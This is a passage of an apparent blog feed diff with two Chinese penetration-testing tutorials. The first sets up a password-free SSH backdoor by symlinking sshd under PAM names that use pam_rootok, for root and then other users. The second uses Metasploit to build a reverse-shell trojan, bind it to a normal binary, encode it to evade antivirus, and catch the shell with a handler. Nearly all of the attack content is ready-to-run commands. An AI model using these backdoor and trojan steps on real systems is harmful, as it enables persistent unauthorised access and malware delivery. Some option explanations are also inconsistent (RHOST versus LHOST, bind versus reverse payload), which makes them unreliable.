+该模块可以使 root 用户直接通过身份认证，&lt;strong&gt;不需要&lt;/strong&gt;输入密码。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;当我们指定的端口的软链接文件为 &lt;strong&gt;/ 路径 /su&lt;/strong&gt; 的时候，若从该端口&lt;strong&gt;连接 ssh&lt;/strong&gt;，&lt;strong&gt;PAM&lt;/strong&gt; 就会去路径 &lt;code&gt;/etc/pam.d/&lt;/code&gt;  下找到对应的配置文件，即 **/etc/pam.d/su**，&lt;br /&gt;
+然后使用 &lt;strong&gt;su&lt;/strong&gt; 中启用的&lt;strong&gt; pam_rootok.so&lt;/strong&gt; 模块，实现无密登录。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;创建root账户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#创建root账户&#34;&gt;#&lt;/a&gt; 创建 root 账户&lt;/h3&gt;
+&lt;p&gt;创建 ssh 软链接： &lt;code&gt;ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=端口号&lt;/code&gt; （端口号确保可用）&lt;/p&gt;
+&lt;p&gt;这条命令，先是使用 ln 强制 (-f) 创建，路径为 &lt;code&gt;/usr/sbin/sshd&lt;/code&gt;  文件的软连接 (-s)，并保存为 &lt;code&gt;/usr/local/su&lt;/code&gt;  文件（&lt;strong&gt;路径随意&lt;/strong&gt;、&lt;strong&gt;文件名可变&lt;/strong&gt;），然后把 su 文件（sshd）连到指定的端口&lt;/p&gt;
+&lt;p&gt;其中，创建的软连接名字虽然可变，但是也&lt;strong&gt;不能随便命名&lt;/strong&gt;。可用的名字可以通过命令： &lt;code&gt;find /etc/pam.d|xargs grep &amp;quot;pam_rootok&amp;quot;&lt;/code&gt;  查看：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441558/Typera/2023/04/fc163d487f4169876de475b8ddda580f.png&#34; alt=&#34;image-20230426005233857&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;实现-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#实现-4&#34;&gt;#&lt;/a&gt; 实现：&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441561/Typera/2023/04/ca4d722ad8a618c1764639e0467bfd32.png&#34; alt=&#34;image-20230426005237555&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这时候就能从 2333 端口，用 root 身份登入了（ &lt;code&gt;ssh root@192.168.158.128 -p 2333&lt;/code&gt; ）：&lt;br /&gt;
+这里使用 cmd 演示：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441566/Typera/2023/04/b10b4b1d4b022009231a95b178468b94.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;创建其它账户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#创建其它账户&#34;&gt;#&lt;/a&gt; 创建其它账户&lt;/h3&gt;
+&lt;p&gt;PAM 中事先是没有供其他用户免密登录的配置文件的，所以，要事先使用下面的命令，用 echo 把引号内的内容保存到 &lt;code&gt;/etc/pam.d/用户名&lt;/code&gt; 的文件里面，让以你的用户名为文件名的配置文件使用&lt;strong&gt; pam_rootok.so&lt;/strong&gt; 模块。&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; #%PAM-1.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; auth       sufficient   pam_rootok.so&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; auth       include      system-auth&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; account    include      system-auth&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; password   include      system-auth&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; session    include      system-auth &amp;quot; &amp;gt;&amp;gt; /etc/pam.d/已有的用户名&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
+ 现在可以看到，在 &lt;code&gt;/etc/pam.d/&lt;/code&gt;  文件夹下出现了一个，以你设定的用户名为名的配置文件（这里为&lt;strong&gt; kali&lt;/strong&gt;）：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441571/Typera/2023/04/2ac6a6a91723dcd035e8e9a5163dfc92.png&#34; alt=&#34;image-20230426005247027&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;现在再执行 &lt;code&gt;find /etc/pam.d|xargs grep &amp;quot;pam_rootok&amp;quot;&lt;/code&gt;  命令查找，可以看到，可用的名字已经多了一个&lt;strong&gt; kali&lt;/strong&gt; 了：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441578/Typera/2023/04/1083edad21219c631ebbe5a28ceaba4f.png&#34; alt=&#34;image-20230426005254226&#34; /&gt;&lt;br /&gt;
+ 现在再使用命令： &lt;code&gt;ln -sf /usr/sbin/sshd /usr/local/kali;/usr/local/kali -oPort=端口号&lt;/code&gt; 创建软链接，就能达到普通用户免密登陆的效果&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;实现：&lt;/strong&gt;&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441582/Typera/2023/04/4b19889af9d0e88eadf9e812f25d2cd0.png&#34; alt=&#34;image-20230426005258790&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682441588/Typera/2023/04/e00aa90c6fe6c5fda03c942cf6a9fd29.png&#34; alt=&#34;image-20230426005304178&#34; /&gt;&lt;/p&gt;
+</content>
+        <category term="Backdoor" />
+        <category term="Linux" />
+        <category term="Kali" />
+        <updated>2022-04-02T15:35:57.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/Metasploit-%E6%9C%A8%E9%A9%AC%E7%BC%96%E8%AF%91%E5%88%A9%E7%94%A8/</id>
+        <title>Metasploit 木马编译利用</title>
+        <link rel="alternate" href="https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/Metasploit-%E6%9C%A8%E9%A9%AC%E7%BC%96%E8%AF%91%E5%88%A9%E7%94%A8/"/>
+        <content type="html">&lt;div class=&#34;note default&#34;&gt;
+&lt;p&gt;&lt;strong&gt;Metasploit&lt;/strong&gt; 是一个开源的，可用来&lt;strong&gt;发现&lt;/strong&gt;、&lt;strong&gt;验证&lt;/strong&gt;并&lt;strong&gt;利用&lt;/strong&gt;漏洞的渗透测试平台。&lt;/p&gt;
+&lt;p&gt;Kali 中默认安装了 &lt;strong&gt;Metasploit&lt;/strong&gt; 框架。&lt;/p&gt;
+&lt;/div&gt;
+&lt;h2 id=&#34;msfvenom-命令实现木马生成-捆绑以及免杀处理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#msfvenom-命令实现木马生成-捆绑以及免杀处理&#34;&gt;#&lt;/a&gt; msfvenom 命令实现木马生成、捆绑以及免杀处理&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;简介：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;msfvenom&lt;/strong&gt; 是 &lt;strong&gt;Metasploit&lt;/strong&gt; 中的一个命令。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;msfvenom&lt;/strong&gt; 命令结合了 msfpayload 和 msfencoder 的功能，能够&lt;strong&gt;生成木马&lt;/strong&gt;，并实现木马编码&lt;strong&gt;免杀&lt;/strong&gt;和避免坏字符、捆绑木马等。&lt;/p&gt;
+&lt;h3 id=&#34;msfvenom-命令用法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#msfvenom-命令用法&#34;&gt;#&lt;/a&gt; msfvenom 命令用法&lt;/h3&gt;
+&lt;p&gt;涉及到的&lt;strong&gt;选项&lt;/strong&gt;有：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;-l&lt;/strong&gt;：列出指定&lt;strong&gt;模块&lt;/strong&gt;（包括 payloads, encoders, nops, platforms, archs, encrypt, formats, all）的所有可用&lt;strong&gt;资源&lt;/strong&gt;。其中 &lt;strong&gt;payloads&lt;/strong&gt; 对应的就是&lt;strong&gt;木马&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;-p&lt;/strong&gt;：指定需要使用的 &lt;strong&gt;payload&lt;/strong&gt; ，可以指定 ‘-’ 或者 stdin 来&lt;strong&gt;自定义&lt;/strong&gt; payload。&lt;br /&gt;
+如果不知道 payload 包括哪些选项，可以使用  &lt;code&gt;--list-options&lt;/code&gt;  列出 payload 的标准选项。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;-f&lt;/strong&gt;：指定 payload 的&lt;strong&gt;输出格式&lt;/strong&gt;，可以使用  &lt;code&gt;--list formats&lt;/code&gt;  来列出可选的格式。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;-o&lt;/strong&gt;：指定输出的 payload 的&lt;strong&gt;保存路径&lt;/strong&gt;，也可以采用&lt;strong&gt;重定向&lt;/strong&gt;的方式来替代 - o 选项。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;-x&lt;/strong&gt;： 指定一个&lt;strong&gt;自定义&lt;/strong&gt;的&lt;strong&gt;可执行文件&lt;/strong&gt;作为模板。即，把木马&lt;strong&gt;捆绑&lt;/strong&gt;到指定的可执行文件上。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;-e&lt;/strong&gt;：指定使用的&lt;strong&gt;编码器&lt;/strong&gt;（）。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;-i&lt;/strong&gt;： 指定对 payload 编码的&lt;strong&gt;次数&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;木马生成&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#木马生成&#34;&gt;#&lt;/a&gt; 木马生成&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;先使用  &lt;code&gt;msfvenom -l payloads&lt;/code&gt;  命令，查看&lt;strong&gt;可用的木马&lt;/strong&gt;。&lt;br /&gt;
+因为可用的木马有&lt;strong&gt;很多&lt;/strong&gt;，所以可以根据所需木马的特性、结合 &lt;strong&gt;grep&lt;/strong&gt; 限定木马的种类 &lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442146/Typera/2023/04/ebeb726eacc7fad3302b80554fb13af1.png&#34; alt=&#34;image-20230426010221520&#34; /&gt;&lt;br /&gt;
+ 以木马  &lt;code&gt;linux/x86/meterpreter/reverse_tcp&lt;/code&gt; （反向连接) 作为样例，&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/li&gt;
+&lt;li&gt;查看该木马&lt;strong&gt;需要设置的选项&lt;/strong&gt;：&lt;br /&gt;
+ &lt;code&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp --list-options&lt;/code&gt; &lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442254/Typera/2023/04/874f3751e4961c5140e9e30ca40f22e7.png&#34; alt=&#34;image-20230426010409894&#34; /&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&amp;lt;br&amp;gt;&lt;/p&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;
+&lt;p&gt;查看可指定的&lt;strong&gt;输出格式&lt;/strong&gt;：&lt;br /&gt;
+ &lt;code&gt;msfvenom --list formats&lt;/code&gt; &lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442270/Typera/2023/04/38ea1bb4d485262080541e030e6fc0a3.png&#34; alt=&#34;image-20230426010426398&#34; /&gt;&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;参考上面得到的信息，构造&lt;strong&gt;生成木马&lt;/strong&gt;的命令：&lt;br /&gt;
+ &lt;code&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.158.132 LPORT=4444 -f elf -o /root/payload.elf&lt;/code&gt; &lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442278/Typera/2023/04/09553b61c2c9d88fe78ede3ea742468a.png&#34; alt=&#34;image-20230426010433724&#34; /&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;其中，&lt;strong&gt;-p&lt;/strong&gt; 选择生成的木马为：&lt;strong&gt;linux/x64/shell_bind_tcp&lt;/strong&gt;；&lt;br /&gt;
+&lt;strong&gt;RHOST&lt;/strong&gt; 指定将要攻击的&lt;strong&gt;目标主机&lt;/strong&gt;的&lt;strong&gt; IP&lt;/strong&gt;；&lt;br /&gt;
+&lt;strong&gt;LPORT&lt;/strong&gt; 指定对应端口号（默认为 4444，故可以不写）；&lt;br /&gt;
+&lt;strong&gt;-f&lt;/strong&gt; 指定生成木马文件的文件&lt;strong&gt;类型&lt;/strong&gt;为 &lt;strong&gt;elf&lt;/strong&gt;&lt;br /&gt;
+&lt;strong&gt;-o&lt;/strong&gt; 指定保存生成的木马文件的&lt;strong&gt;地址&lt;/strong&gt;为：&lt;strong&gt;/root/payload.elf&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;木马捆绑&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#木马捆绑&#34;&gt;#&lt;/a&gt; 木马捆绑&lt;/h3&gt;
+&lt;p&gt;通常情况下，木马会和正常的文件&lt;strong&gt;捆绑&lt;/strong&gt;在一起，方便木马进行&lt;strong&gt;感染&lt;/strong&gt;和&lt;strong&gt;传播&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;所以，我们要事先准备好一个用于&lt;strong&gt;绑定&lt;/strong&gt;的文件，这里选用的是  &lt;code&gt;/root/hello_world&lt;/code&gt; （ &lt;strong&gt;gcc&lt;/strong&gt; 编译的一个简单的 C 程）。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.158.132 LPORT=4444 -f elf -x /root/hello_world -o /root/payload_bundle.elf&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442285/Typera/2023/04/c7bc72a382ae694be589d6a5cb25a3de.png&#34; alt=&#34;image-20230426010440843&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;其中，&lt;strong&gt;-x&lt;/strong&gt; 指定&lt;strong&gt;绑定&lt;/strong&gt;的可执行文件为  &lt;code&gt;/root/hello_world&lt;/code&gt; ，其余项与生成木马的指令一致。&lt;/p&gt;
+&lt;h3 id=&#34;木马免杀&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#木马免杀&#34;&gt;#&lt;/a&gt; 木马免杀&lt;/h3&gt;
+&lt;p&gt;在杀毒软件泛滥的今天，不对木马文件进行免杀处理很难通过&lt;strong&gt;杀软的检查&lt;/strong&gt;，所以需要对木马进行&lt;strong&gt;免杀&lt;/strong&gt;处理。&lt;/p&gt;
+&lt;p&gt;查看可用的编码器： &lt;code&gt;msfvenom -l encoders&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442290/Typera/2023/04/d9aa39a90db02fe251a93aff3dd31cb7.png&#34; alt=&#34;image-20230426010444808&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;选用&lt;strong&gt;免杀&lt;/strong&gt;效果较好的 &lt;strong&gt;x86/shikata_ga_nai&lt;/strong&gt; 编译器进行编码。&lt;br /&gt;
+命令： &lt;code&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.158.132 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f elf -x /root/hello_world -o /root/payload_Anti_Virus.elf&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442294/Typera/2023/04/9f32f881202e4a535bac4f5ce0f8c517.png&#34; alt=&#34;image-20230426010449517&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;其中，&lt;strong&gt;-e&lt;/strong&gt; 指定编译器为 &lt;strong&gt;x86/shikata_ga_nai&lt;/strong&gt;，&lt;br /&gt;
+&lt;strong&gt;-i&lt;/strong&gt; 指定编码的次数为 5 次。&lt;br /&gt;
+编码 &lt;strong&gt;5&lt;/strong&gt; 次的木马，基本可以&lt;strong&gt;躲避部分&lt;/strong&gt;杀软的查杀，&lt;/p&gt;
+&lt;p&gt;当然可以对木马进行&lt;strong&gt;更多次&lt;/strong&gt;的编码，这样可以&lt;strong&gt;提高&lt;/strong&gt;木马的&lt;strong&gt;免杀机率&lt;/strong&gt;，但是需要注意：这也可能会导致木马&lt;strong&gt;不可使用&lt;/strong&gt;。&lt;/p&gt;
+&lt;h2 id=&#34;msfconsole-木马利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#msfconsole-木马利用&#34;&gt;#&lt;/a&gt; msfconsole 木马利用&lt;/h2&gt;
+&lt;p&gt;使用之前生成的木马文件： &lt;strong&gt;payload.elf&lt;/strong&gt;。&lt;/p&gt;
+&lt;h3 id=&#34;攻击端&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击端&#34;&gt;#&lt;/a&gt; 攻击端：&lt;/h3&gt;
+&lt;p&gt;输入命令  &lt;code&gt;msfconsole&lt;/code&gt;  打开 &lt;strong&gt;MSF 控制台&lt;/strong&gt;&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442298/Typera/2023/04/2c2e815f13d049741cd9371ace771daa.png&#34; alt=&#34;image-20230426010454524&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;输入命令： &lt;code&gt;use exploit/multi/handler&lt;/code&gt; ，选择 exploit 模块&lt;/p&gt;
+&lt;p&gt;然后，可以输入命令  &lt;code&gt;show options&lt;/code&gt;  查看&lt;strong&gt;设置的参数&lt;/strong&gt;（查看还要设置哪些）&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1704010005/Typera/2023/12/4a6d04ee3788a771e9fe642e64fa8104.png&#34; alt=&#34;trojan-horse10&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;命令  &lt;code&gt;set PAYLOAD linux/x86/meterpreter/reverse_tcp&lt;/code&gt;  ，设置 &lt;strong&gt;PAYLOAD&lt;/strong&gt;&lt;br /&gt;
+ 命令  &lt;code&gt;set LHOST 192.168.158.132&lt;/code&gt; ，设置 local host 的&lt;strong&gt; IP&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;命令  &lt;code&gt;run&lt;/code&gt;  开始&lt;strong&gt;监听&lt;/strong&gt;对应的端口，等待&lt;strong&gt;目标服务器&lt;/strong&gt;执行&lt;strong&gt;木马&lt;/strong&gt;后，就能获得 &lt;strong&gt;shell&lt;/strong&gt;。&lt;br /&gt;
+如下图所示：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442304/Typera/2023/04/8b2780434593170f1b8173cf9fa13836.png&#34; alt=&#34;image-20230426010500036&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;目标服务器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目标服务器&#34;&gt;#&lt;/a&gt; 目标服务器：&lt;/h3&gt;
+&lt;p&gt;用各种方式将&lt;strong&gt;木马文件&lt;/strong&gt;传到&lt;strong&gt;目标服务器&lt;/strong&gt;上，&lt;/p&gt;
+&lt;p&gt;命令  &lt;code&gt;chmod +x payload.elf&lt;/code&gt;  更改文件执行权限&lt;/p&gt;
+&lt;p&gt;执行 &lt;strong&gt;payload.elf&lt;/strong&gt; 文件（&lt;strong&gt;顺序&lt;/strong&gt;：要在攻击端开始监听之后执行）：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682442311/Typera/2023/04/80d816c18312f780f743c4b82696c43f.png&#34; alt=&#34;image-20230426010506608&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;整理一下：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;攻击端：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;msfconsole&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;use exploit/multi/handler&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set PAYLOAD linux/x86/meterpreter/reverse_tcp&lt;/code&gt; &lt;br /&gt;
+4. &lt;code&gt; set LHOST 192.168.158.132&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;run&lt;/code&gt; ，开始监听&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;目标服务器：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol&gt;
+&lt;li&gt;下载木马文件&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;chmod +x payload.elf&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;./ payload.elf&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+</content>
+        <category term="Linux" />
+        <category term="Kali" />
+        <category term="Trojan horse" />
+        <category term="Metasploit" />
+        <updated>2022-04-02T15:29:09.000Z</updated>
+    </entry>
+</feed>
